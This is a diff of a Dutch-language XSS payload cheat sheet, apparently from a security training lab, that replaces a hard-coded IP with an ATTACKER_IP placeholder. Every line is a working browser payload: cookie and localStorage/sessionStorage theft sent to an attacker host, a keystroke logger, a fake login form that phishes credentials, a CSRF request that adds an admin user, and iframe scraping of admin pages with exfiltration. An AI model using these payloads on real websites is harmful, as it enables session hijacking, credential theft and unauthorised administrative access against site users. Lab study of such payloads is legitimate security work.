@@ -1,18 +1,18 @@
 # XSS - Data Exfiltratie Payloads
 # === Cookie stealing (als HttpOnly niet gezet) ===
-new Image().src="http://10.0.0.1/steal?c="+document.cookie
+new Image().src="http://ATTACKER_IP/steal?c="+document.cookie
 # Of via fetch:
-fetch("http://10.0.0.1/steal?c="+document.cookie)
+fetch("http://ATTACKER_IP/steal?c="+document.cookie)
 # === localStorage / sessionStorage ===
-fetch("http://10.0.0.1/steal?ls="+encodeURIComponent(JSON.stringify(localStorage)))
-fetch("http://10.0.0.1/steal?ss="+encodeURIComponent(JSON.stringify(sessionStorage)))
+fetch("http://ATTACKER_IP/steal?ls="+encodeURIComponent(JSON.stringify(localStorage)))
+fetch("http://ATTACKER_IP/steal?ss="+encodeURIComponent(JSON.stringify(sessionStorage)))
 # === Keylogger ===
-document.addEventListener('keydown',function(e){new Image().src="http://10.0.0.1/log?k="+e.key;});
+document.addEventListener('keydown',function(e){new Image().src="http://ATTACKER_IP/log?k="+e.key;});
 # === Credential phishing (pagina vervangen) ===
-document.getElementsByTagName("html")[0].innerHTML='<h1>Sessie verlopen</h1><form action="http://10.0.0.1/phish" method="POST"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>';
+document.getElementsByTagName("html")[0].innerHTML='<h1>Sessie verlopen</h1><form action="http://ATTACKER_IP/phish" method="POST"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>';
 # === CSRF via XSS (actie uitvoeren als slachtoffer) ===
 fetch("/admin/adduser",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"username=hacker&password=hacked&role=admin",credentials:"include"})
 # === Authenticated content scraping (iframe methode) ===
-var i=document.createElement('iframe');i.src='/admin/secret';i.onload=function(){fetch("http://10.0.0.1/exfil",{method:"POST",body:i.contentDocument.body.innerHTML})};document.body.appendChild(i);
+var i=document.createElement('iframe');i.src='/admin/secret';i.onload=function(){fetch("http://ATTACKER_IP/exfil",{method:"POST",body:i.contentDocument.body.innerHTML})};document.body.appendChild(i);
 # Tip: Gebruik de /x.js beacon van dit lab voor automatische hooking
 # Tip: HttpOnly cookies zijn NIET via JS te lezen - gebruik dan CSRF
